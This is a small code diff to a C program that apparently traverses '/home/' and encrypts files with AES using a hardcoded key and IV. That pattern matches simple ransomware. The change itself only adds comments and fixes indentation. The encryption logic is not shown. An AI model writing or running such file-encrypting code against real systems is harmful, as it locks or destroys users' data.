@@ -6,8 +6,8 @@
 #include <openssl/aes.h>
 
 
-void ls_dir(char* start_path);
-void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);
+void ls_dir(char* start_path); // function declaration
+void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv); // function declaration
 
 
 int main()
@@ -15,8 +15,8 @@ int main()
    
 	
 	char* start_path;
-	start_path = "/home/";
-    ls_dir(start_path);
+	start_path = "/home/";// linux home directory
+        ls_dir(start_path); // passing startpath in ls dir function
 
     return 0;
 }
@@ -24,7 +24,7 @@ int main()
 void ls_dir(char* start_path)
 {
 	unsigned char key[] = "12345678901234561234567890123456";// 32 char 256bit key
-    unsigned char iv[] = "1234567890123456";//same size as block 16 char 128 bit block
+        unsigned char iv[] = "1234567890123456";//same size as block 16 char 128 bit block
 
 	DIR* dir;
 	struct dirent *ent;
